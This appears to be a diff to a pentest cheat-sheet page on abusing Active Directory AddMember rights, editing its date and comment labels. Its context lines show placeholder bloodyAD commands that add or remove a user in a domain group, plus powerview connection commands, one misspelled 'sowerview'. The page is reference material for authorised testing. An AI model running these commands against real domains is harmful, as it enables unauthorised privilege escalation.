@@ -1,6 +1,6 @@
 ---
 title: "AddMember"
-date: 2024-11-1
+date: 2025-7-25
 tags: ["Powerview", "AddMember", "Domain Controller", "Active Directory", "Windows", "BloodyAD"]
 ---
 
@@ -13,12 +13,12 @@ tags: ["Powerview", "AddMember", "Domain Controller", "Active Directory", "Windo
 #### 1. Add User to Group
 
 ```console
-# With password
+# Password
 bloodyAD -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --host <DC> --dc-ip <DC_IP> add groupMember '<GROUP>' '<TARGET_USER>'
 ```
 
 ```console
-# With Kerberos
+# Kerberos
 bloodyAD -d <DOMAIN> -u '<USER>' -k --host <DC> --dc-ip <DC_IP> add groupMember '<GROUP>' '<TARGET_USER>'
 ```
 
@@ -30,7 +30,7 @@ bloodyAD -d <DOMAIN> -u '<USER>' -k --host <DC> --dc-ip <DC_IP> add groupMember 
 #### 1. Connect
 
 ```console
-# With password
+# Password
 sudo ntpdate -s <DC_IP> && powerview '<DOMAIN>/<USER>:<PASSWORD>@<TARGET_DOMAIN>'
 ```
 
@@ -43,7 +43,7 @@ PV >
 ```
 
 ```console
-# With Kerberos
+# Kerberos
 sudo ntpdate -s <DC_IP> && sowerview '<DOMAIN>/<USER>@<TARGET_DOMAIN>' -k --no-pass
 ```
 
@@ -94,12 +94,12 @@ MemberSID                   : S-1-5-21-4078382237-1492182817-2568127209-7682
 {{< tabcontent set2 tab1 >}}
 
 ```console
-# With password
+# Password
 bloodyAD -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --host <DC> --dc-ip <DC_IP> remove groupMember '<GROUP>' '<TARGET_USER>'
 ```
 
 ```console
-# With Kerberos
+# Kerberos
 bloodyAD -d <DOMAIN> -u '<USER>' -k --host <DC> --dc-ip <DC_IP> remove groupMember '<GROUP>' '<TARGET_USER>'
 ```
 
